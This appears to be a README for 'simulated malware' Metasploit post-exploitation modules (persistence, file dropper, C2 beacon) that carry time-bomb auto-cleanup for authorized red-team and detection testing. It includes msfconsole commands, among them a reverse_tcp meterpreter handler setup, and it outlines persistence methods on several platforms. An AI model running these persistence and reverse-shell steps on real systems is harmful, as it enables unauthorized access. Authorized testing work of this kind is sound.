# Simulated Malware Feature

## Overview

This repository now includes a **Simulated Malware** category - a new set of post-exploitation modules designed specifically for penetration testing and red team exercises. These modules demonstrate realistic malware behaviors while incorporating automatic cleanup mechanisms to ensure responsible testing practices.

## What Makes This Different?

Traditional penetration testing often requires manual cleanup of persistence mechanisms, dropped files, and other artifacts. This can be:
- Time-consuming
- Error-prone
- Risky if cleanup is forgotten
- Difficult to coordinate across multiple systems

**Simulated Malware modules solve this problem** by including built-in "time-bomb" mechanisms that automatically remove all artifacts after a configurable expiration period.

## Key Features

### üïê Time-Bomb Auto-Cleanup

Every module includes automatic self-destruct:
- Configurable expiration time (typically 1-72 hours)
- Automatic removal of all persistence mechanisms
- Self-deleting scripts and artifacts
- No manual intervention required

### üîí Safe for Testing

Designed with safety in mind:
- Simulated payloads (benign by default)
- Predictable behavior
- Full documentation of all actions
- Transparent cleanup process

### üåç Multi-Platform Support

Works across major platforms:
- Windows (PowerShell, Registry, Scheduled Tasks)
- Linux (Systemd, Cron, shell scripts)
- macOS (LaunchAgents, Cron)
- Unix (Cron, init scripts)

### üìä Detection Testing

Perfect for testing security controls:
- Simulates real malware behaviors
- Creates detectable artifacts
- Tests monitoring and response capabilities
- Validates security tool effectiveness

## Available Modules

### 1. Time-Bomb Persistence (`post/multi/malware/timebomb_persistence`)

Simulates persistent backdoor behavior with automatic removal.

**Demonstrates:**
- Boot/Login persistence
- Interval-based execution
- Platform-specific persistence mechanisms
- Automatic cleanup of all artifacts

**Use Cases:**
- Test persistence detection capabilities
- Demonstrate attack techniques
- Train security teams
- Validate monitoring coverage

**Quick Start:**
```bash
use post/multi/malware/timebomb_persistence
set SESSION 1
set EXPIRATION_HOURS 24
set TRIGGER BOOT
run
```

### 2. Time-Bomb File Dropper (`post/multi/malware/file_dropper_timebomb`)

Uploads files with automatic deletion after expiration.

**Demonstrates:**
- File staging techniques
- Scheduled file cleanup
- Optional file execution
- Multi-platform file operations

**Use Cases:**
- Test file integrity monitoring
- Simulate APT file staging
- Validate EDR/AV detection
- Demonstrate file-based attacks

**Quick Start:**
```bash
use post/multi/malware/file_dropper_timebomb
set SESSION 1
set LOCAL_FILE /tmp/payload.exe
set EXPIRATION_HOURS 24
run
```

### 3. Time-Bomb Beacon (`post/multi/malware/beacon_timebomb`)

Simulates C2 beacon behavior with periodic check-ins.

**Demonstrates:**
- Periodic callback patterns
- Scheduled task/cron usage
- C2 communication simulation (logging only)
- Automatic removal of beacons

**Use Cases:**
- Test scheduled task monitoring
- Validate C2 detection capabilities
- Demonstrate APT TTPs
- Train SOC analysts

**Quick Start:**
```bash
use post/multi/malware/beacon_timebomb
set SESSION 1
set BEACON_INTERVAL 5
set EXPIRATION_HOURS 24
run
```

## Why Use Simulated Malware?

### For Penetration Testers

‚úÖ **Demonstrates realistic attack techniques** without actual malware
‚úÖ **Automatic cleanup** reduces manual work and errors
‚úÖ **Safe for production** with predictable, time-limited behavior
‚úÖ **Professional reporting** with clear documentation and evidence

### For Red Teams

‚úÖ **Realistic adversary simulation** with APT-like behaviors
‚úÖ **Tests blue team detection** and response capabilities
‚úÖ **Multiple platforms** covered with one toolset
‚úÖ **Time-limited operation** for controlled exercises

### For Security Teams

‚úÖ **Tests monitoring and detection** capabilities
‚úÖ **Validates security tool** effectiveness
‚úÖ **Trains analysts** on real-world techniques
‚úÖ **Identifies gaps** in security coverage

## Usage Guidelines

### Best Practices

1. **Get Authorization** - Always obtain written authorization before deployment
2. **Document Deployments** - Record all module usage, times, and systems
3. **Set Appropriate Expiration** - Match to engagement duration (typically 24-72 hours)
4. **Test in Lab First** - Verify functionality and cleanup in isolated environment
5. **Coordinate with Security** - Inform teams when deploying simulated malware
6. **Verify Cleanup** - Confirm artifacts are removed after expiration

### Recommended Expiration Times

| Scenario | Recommended Time | Rationale |
|----------|-----------------|-----------|
| Initial Testing | 1-2 hours | Quick validation |
| Single-Day Pentest | 12-24 hours | Covers engagement |
| Multi-Day Pentest | 24-48 hours | Extended testing |
| Red Team Exercise | 48-72 hours | Realistic simulation |
| Production Systems | Never >72 hours | Safety limit |

### Safety Considerations

‚ö†Ô∏è **Do NOT use simulated malware:**
- Without written authorization
- On systems outside authorized scope
- With expiration times longer than engagement period
- Without coordination with client security teams

‚úÖ **Always:**
- Document every deployment
- Monitor for successful cleanup
- Have manual cleanup procedures ready
- Include in test reports and findings

## Detection Opportunities

These modules create detectable indicators that security tools should identify:

### File System
- Script files in temporary directories
- Hidden files (Unix systems)
- PowerShell scripts (Windows)

### Configuration
- Registry Run keys (Windows)
- Scheduled Tasks (Windows)
- Cron jobs (Linux/Unix/macOS)
- Systemd services (Linux)
- LaunchAgents (macOS)

### Processes
- PowerShell with `-WindowStyle Hidden`
- Background script execution
- Periodic execution patterns

### Logs
- Event logs (Windows Task Scheduler)
- Syslog entries (Cron execution)
- System service logs (Systemd)

## Example Workflow

### 1. Establish Session

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
run
```

### 2. Deploy Simulated Malware

```bash
use post/multi/malware/timebomb_persistence
set SESSION 1
set EXPIRATION_HOURS 24
set TRIGGER BOOT
set VERBOSE true
run
```

### 3. Document Deployment

Record in your test notes:
- Module: `post/multi/malware/timebomb_persistence`
- Target: `WORKSTATION01` (Session 1)
- Deployment Time: `2025-12-14 11:07:25 UTC`
- Expiration: `2025-12-15 11:07:25 UTC` (24 hours)
- Configuration: Boot persistence

### 4. Monitor for Detection

Check if security tools detect:
- File creation in temp directory
- Registry/scheduled task modifications
- PowerShell execution
- Persistence mechanism

### 5. Verify Cleanup

After 24 hours:
- Confirm artifacts are removed
- Verify persistence is gone
- Document cleanup success
- Include in final report

## Documentation

Comprehensive documentation is available:

- **[modules/post/multi/malware/README.md](modules/post/multi/malware/README.md)** - Module overview and usage
- **[documentation/modules/post/multi/malware/](documentation/modules/post/multi/malware/)** - Detailed module documentation
  - `timebomb_persistence.md` - Persistence module guide
  - `file_dropper_timebomb.md` - File dropper guide
  - `beacon_timebomb.md` - Beacon module guide
  - `README.md` - Documentation index and best practices

## Technical Implementation

### Time-Bomb Mechanism

Each module implements time-bomb cleanup through:

1. **Expiration Check** - Scripts check current time vs. expiration timestamp
2. **Conditional Execution** - Payload only executes if not expired
3. **Cleanup Routine** - When expired, removes all artifacts
4. **Self-Destruct** - Script deletes itself after cleanup

### Platform-Specific Techniques

**Windows:**
- PowerShell scripts with hidden execution
- Registry Run keys for persistence
- Scheduled Tasks for periodic execution
- Event-based cleanup

**Linux:**
- Systemd services (requires privileges)
- Cron jobs for scheduling
- Background shell scripts
- Signal-based cleanup

**macOS:**
- LaunchAgents for persistence
- Cron jobs for scheduling
- Hidden scripts in user directories
- Property list configurations

**Unix:**
- Cron-based scheduling
- Init script persistence (when privileged)
- Shell script implementation
- Background processes

## Contributing

To add new simulated malware modules:

1. **Include Time-Bomb** - All modules must have automatic cleanup
2. **Multi-Platform** - Support multiple platforms when possible
3. **Document Thoroughly** - Provide comprehensive documentation
4. **Test Cleanup** - Verify automatic cleanup works correctly
5. **Follow Conventions** - Use existing modules as templates
6. **Security Focus** - Emphasize safety and responsible use

## Support

For questions or issues:

- **Documentation**: [documentation/modules/post/multi/malware/](documentation/modules/post/multi/malware/)
- **GitHub Issues**: [metasploit-framework issues](https://github.com/rapid7/metasploit-framework/issues)
- **Community**: [Metasploit Slack](https://www.metasploit.com/slack)

## Legal Notice

‚ö†Ô∏è **Warning**: These modules should only be used in authorized testing scenarios. Unauthorized use may violate computer fraud and abuse laws. Always obtain written authorization before deployment.

## References

- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [Post-Exploitation Modules](https://docs.metasploit.com/docs/using-metasploit/intermediate/post-exploitation/)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)

---

**License**: Metasploit Framework License (BSD)

**Authors**: Metasploit Framework Team

**Date**: December 2025
